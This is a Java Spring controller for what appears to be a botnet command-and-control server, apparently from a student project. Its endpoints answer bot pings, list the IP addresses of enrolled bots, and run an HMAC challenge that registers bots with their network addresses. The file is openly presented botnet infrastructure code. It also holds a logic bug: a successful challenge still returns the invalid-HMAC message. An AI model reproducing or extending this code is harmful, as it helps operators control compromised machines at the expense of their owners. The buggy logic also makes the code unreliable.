package cs.sii.controller;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.http.HttpStatus;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.ModelAndView;

import cs.sii.bot.active.CryptoAuth;
import cs.sii.bot.passive.Bot;
import cs.sii.config.bot.Engine;
import cs.sii.connection.NetworkService;
import cs.sii.dao.Botter;
import cs.sii.dao.BotterRepository;
import cs.sii.model.IP;
import cs.sii.model.Pairs;

@Controller
public class CommandController {

	@Autowired
	private Engine engineBot;

	@Autowired
	private CryptoAuth auth;

	@Autowired
	private BotterRepository botRepository;

	@Autowired
	private NetworkService networkService;

	// Controller che intercetta i ping dei bot
	@RequestMapping(value = "/BotPing", method = RequestMethod.POST)
	@ResponseBody
	public String BotPing(HttpServletResponse error) throws IOException {
		String response = "";
		if (engineBot.isCommandandconquerStatus()) {
			response = "ping";
		} else {
			error.sendError(HttpStatus.SC_NOT_FOUND);
		}
		return response;

	}

	@RequestMapping(value = "/BotNet", method = RequestMethod.GET)
	@ResponseBody
	public List<IP> getAllBotNet(HttpServletResponse error) throws IOException {
		List<IP> response = new ArrayList<IP>();

		if (engineBot.isCommandandconquerStatus()) {
			response = networkService.getBotIps().getIPList();
		} else {
			error.sendError(HttpStatus.SC_NOT_FOUND);
		}
		return response;
	}

	// CONTROLLER PER LA GESTIONE DELLA CHALLENGE DI AUTENTICAZIONE//////

	@RequestMapping(value = "/welcome", method = RequestMethod.POST)
	@ResponseBody
	public Pairs<Long, Integer> botFirstAcces(@RequestBody String idBot, HttpServletResponse error) throws IOException {
		System.out.println("1");
		Pairs<Long, Integer> response = new Pairs<>();
		if (engineBot.isCommandandconquerStatus()) {
			Long keyNumber = new Long(auth.generateNumberText());
			Integer iterationNumber = new Integer(auth.generateIterationNumber());
			auth.addBotChallengeInfo(idBot, keyNumber, iterationNumber);
			response = new Pairs<Long, Integer>(keyNumber, iterationNumber);
		} else {
			error.sendError(HttpStatus.SC_NOT_FOUND);
		}
		System.out.println("2");

		return response;
	}

	@RequestMapping(value = "/hmac", method = RequestMethod.POST)
	@ResponseBody
	public String botFirstAccesSecondPhase(@RequestBody ArrayList<Object> objects, HttpServletResponse error,
			HttpServletRequest request) throws IOException {
		String response = "";

		if (engineBot.isCommandandconquerStatus()) {
			if (auth.findBotChallengeInfo(objects.get(1).toString())) {

				String idBot = objects.get(1).toString();
				Long keyNumber = auth.getBotSeed().get(idBot).getValue1();
				Integer iterationNumber = auth.getBotSeed().get(idBot).getValue2();

				if (auth.validateHmac(keyNumber, iterationNumber, objects.get(0).toString())) {
					response = "Challenge OK";
					botRepository
							.save(new Botter(idBot, request.getRemoteAddr().toString() + ":" + request.getRemotePort(),
									objects.get(3).toString(), objects.get(2).toString()));
					//TODO DA decidere send some peers
				}

				response = "Challenge con HMAC non valido";
			}
		} else {
			response = "Challenge Error";
			error.sendError(HttpStatus.SC_NOT_FOUND);
		}
		return response;
	}

	/////////////////////////////////////////////////////////////////////////

	@RequestMapping(value = "/test", method = RequestMethod.GET)
	public String test() {
		

		return "white";
	}

	@RequestMapping(value = "/prova", method = RequestMethod.GET)
	@ResponseBody
	public String prova() {

		return engineBot.getIdBot();
	}

}
